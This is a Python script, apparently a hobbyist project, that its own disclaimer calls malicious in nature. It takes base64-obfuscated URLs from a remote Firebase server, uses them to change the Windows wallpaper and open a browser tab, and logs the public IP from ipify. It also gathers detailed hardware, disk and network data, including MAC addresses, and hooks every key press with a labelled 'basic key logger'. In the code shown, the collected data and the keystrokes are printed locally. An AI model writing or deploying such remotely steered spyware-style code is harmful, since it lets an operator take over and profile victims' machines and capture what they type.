#/////////////////////////////////////////////////////////////////////////////////////////////#
#//////////////////////////////////////!!!DISCLAIMER!!!///////////////////////////////////////#
#/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/#
#                                                                                             #
#  i developed this script in in under 24hours its very janky it is not intended to be spread #
#   at all, i made it to learn Json requests, if i belive this script has been spread i can   #
#Remotely stop it from working by disableing the firebase server it connects to i did this so #
#         if it did leak it wouldnt harm the public, think of it like a kill switch           #
#    althugh this script is malicios in nature this is not its intentions it is intended      # 
# so that i can learn python and the only target of this software will be my self and willing #
#               participents who understand the risks of running this script                  #
#                                                                                             #
#     ////////I WILL NEVER WILLINGLIY DISTROBUTE MALWARE EVER TO UNKNOWING VICTIMS////////    #
#                                                                                             #
#/////////////////////////////////////////////////////////////////////////////////////////////#
import base64
import webbrowser
import ctypes
import requests
from PIL import Image
from io import BytesIO
import os
import platform
import psutil
from datetime import datetime
import cpuinfo
import socket
import keyboard
import platform
import cpuinfo
import psutil
import datetime
import uuid
import re
import json
#------------------------ IP logging ------------------------#
IPR = requests.get('https://api.ipify.org') # for debug reasons only!!!!!!!
print(IPR.text)
#------------------------------------------------------------#
#/////////////////////////System info////////////////////////#
#------------------------------------------------------------#
def System_information():
    system_info = {}

    # System Information
    uname = platform.uname()
    system_info['System_Information'] = {
        'System': uname.system,
        'Node_Name': uname.node,
        'Release': uname.release,
        'Version': uname.version,
        'Machine': uname.machine,
        'Processor': uname.processor,
        'CPU_Brand': cpuinfo.get_cpu_info()['brand_raw'],
        # Add more system information as needed
    }

    # Boot Time
    boot_time_timestamp = psutil.boot_time()
    bt = datetime.datetime.fromtimestamp(boot_time_timestamp)
    system_info['Boot_Time'] = {
        'Boot_Time': f"{bt.year}/{bt.month}/{bt.day} {bt.hour}:{bt.minute}:{bt.second}"
    }

    # CPU Info
    cpufreq = psutil.cpu_freq()
    system_info['CPU_Info'] = {
        'Physical_Cores': psutil.cpu_count(logical=False),
        'Total_Cores': psutil.cpu_count(logical=True),
        'Max_Frequency': f"{cpufreq.max:.2f}Mhz",
        'Min_Frequency': f"{cpufreq.min:.2f}Mhz",
        'Current_Frequency': f"{cpufreq.current:.2f}Mhz",
        # Add more CPU information as needed
    }

    # Memory Information
    svmem = psutil.virtual_memory()
    system_info['Memory_Information'] = {
        'Total': get_size(svmem.total),
        'Available': get_size(svmem.available),
        'Used': get_size(svmem.used),
        'Percentage': svmem.percent,
        # Add more memory information as needed
    }

    # Disk Information
    disk_info = {}
    partitions = psutil.disk_partitions()
    for partition in partitions:
        partition_info = {}
        try:
            partition_usage = psutil.disk_usage(partition.mountpoint)
            partition_info = {
                'Total_Size': get_size(partition_usage.total),
                'Used': get_size(partition_usage.used),
                'Free': get_size(partition_usage.free),
                'Percentage': partition_usage.percent,
            }
        except PermissionError:
            pass
        disk_info[partition.device] = partition_info

    system_info['Disk_Information'] = disk_info

    # Network Information
    network_info = {}
    if_addrs = psutil.net_if_addrs()
    for interface_name, interface_addresses in if_addrs.items():
        interface_info = {}
        for address in interface_addresses:
            if str(address.family) == 'AddressFamily.AF_INET':
                interface_info['IP_Address'] = address.address
                interface_info['Netmask'] = address.netmask
                interface_info['Broadcast_IP'] = address.broadcast
            elif str(address.family) == 'AddressFamily.AF_PACKET':
                interface_info['MAC_Address'] = address.address
                interface_info['Netmask'] = address.netmask
                interface_info['Broadcast_MAC'] = address.broadcast
        network_info[interface_name] = interface_info

    system_info['Network_Information'] = network_info

    # IO Statistics
    disk_io = psutil.disk_io_counters()
    network_io = psutil.net_io_counters()
    system_info['IO_Statistics'] = {
        'Disk': {
            'Total_Read': get_size(disk_io.read_bytes),
            'Total_Write': get_size(disk_io.write_bytes),
        },
        'Network': {
            'Total_Bytes_Sent': get_size(network_io.bytes_sent),
            'Total_Bytes_Received': get_size(network_io.bytes_recv),
        }
    }

    return system_info

def get_size(bytes, suffix="B"):
    factor = 1024
    for unit in ["", "K", "M", "G", "T", "P"]:
        if bytes < factor:
            return f"{bytes:.2f}{unit}{suffix}"
        bytes /= factor

def open_youtube():
    #//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////#
    #       utilises base64 encryption to get a youtube link from a firebase server that is then played on the users browser       #
    #            also allows the operator of the firebase server to change the links without sending a new file to users           #
    #//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////#
    DBL = "REMOVED"
    Decry_DBL = base64.b64decode(DBL)
    DBOP = requests.get(Decry_DBL)
    DBDCL = base64.b64decode(DBOP.text)
    webbrowser.open_new_tab(DBDCL)

#basic key logger
def on_key_press(event):
    print("Key pressed:", event.name)

def set_wallpaper(image_url):
    # Download the image from the URL
    response = requests.get(image_url)
    if response.status_code == 200:
        image_data = BytesIO(response.content)
        img = Image.open(image_data)

        # Save the image to a temporary file
        temp_file = os.path.join(os.environ['TEMP'], 'wallpaper.jpg')
        img.save(temp_file, 'JPEG')

        # Set the wallpaper
        SPI_SETDESKWALLPAPER = 20
        ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, temp_file, 3)
        print("Wallpaper has been set successfully.")
    else:
        print("Failed to download the image.")

if __name__ == "__main__":
    # Sets the image from a firebase server similar to the youtube function
    IMGDBL = "REMOVED"
    Decry_IMGDBL = base64.b64decode(IMGDBL)
    IMGDBOP = requests.get(Decry_IMGDBL)
    image_url = base64.b64decode(IMGDBOP.text)
    #------------------------------------------------------#
    set_wallpaper(image_url)
    open_youtube()
    System_information()

    system_info_json = System_information()
    print(json.dumps(system_info_json, indent=4))

    keyboard.on_press(on_key_press)
    keyboard.wait('esc')  # Press 'esc' to exit

#--------------------------------------------------------------------------------------------------------------#
